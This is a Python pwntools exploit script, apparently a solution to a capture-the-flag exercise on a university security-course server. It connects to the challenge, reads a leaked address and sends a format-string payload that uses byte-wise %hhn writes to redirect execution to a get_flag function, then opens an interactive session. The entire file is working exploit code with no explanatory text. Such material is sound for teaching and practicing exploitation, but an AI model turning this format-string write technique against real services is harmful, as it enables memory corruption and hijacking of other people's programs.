#!/usr/bin/env python

from pwn import *

r = remote("secprog.cs.nctu.edu.tw",10105)

data = r.recv()
r.recvuntil("at ")
data = int(r.recvn(10),16)

print hex(data)

get_flag = int("0x804861d",16)
get_flag = [ ( get_flag % ( 1 << 8 * ( i + 1 ) ) ) >> ( 8 * i ) for i in xrange(4) ]

payload = ""

for i in xrange(4):
    payload += p32( data + i )

offset = 16

for i in xrange(4):
    payload += "%{}c".format( ( get_flag[i] - offset + 256 ) % 256 )
    payload += "%{}$hhn".format( i + 7 )
    offset += ( get_flag[i] - offset + 256 ) % 256

r.send(payload)

r.interactive()
